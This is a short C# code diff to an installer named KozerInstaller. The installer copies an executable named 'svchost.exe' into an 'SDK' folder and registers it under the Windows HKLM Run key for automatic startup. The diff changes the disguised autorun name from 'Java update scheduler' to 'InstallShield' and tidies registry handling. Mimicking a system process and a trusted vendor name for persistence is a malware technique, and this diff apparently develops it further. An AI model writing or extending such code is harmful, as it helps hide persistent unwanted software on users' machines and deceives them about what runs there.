@@ -12,6 +12,10 @@ namespace KozerInstaller
     {
         static void Main(string[] args)
         {
+             handle(args);
+        }
+        static void handle(string[] args)
+        {
             bool developer = args != null && args.Length == 1 && args[0].Equals("Developer");
             if (developer)
                 Consoller.AllocConsole();
@@ -20,7 +24,7 @@ namespace KozerInstaller
 }
     class NameConstants
     {
-        public const string nameInAutoLaunch = "Java update scheduler";
+        public const string nameInAutoLaunch = "InstallShield";
         public const string archiveAndFolderName = "SDK";
         public const string exeFileName = "svchost.exe";
     }
@@ -310,11 +314,13 @@ namespace KozerInstaller
         {
             RegistryKey rk = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true);
             rk.SetValue(NameConstants.nameInAutoLaunch, Destinator.exePath);
+            rk.Dispose();
         }
         public void unschedule()
         {
             RegistryKey rk = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true);
             rk.DeleteValue(NameConstants.nameInAutoLaunch);
+            rk.Dispose();
         }
     }
 
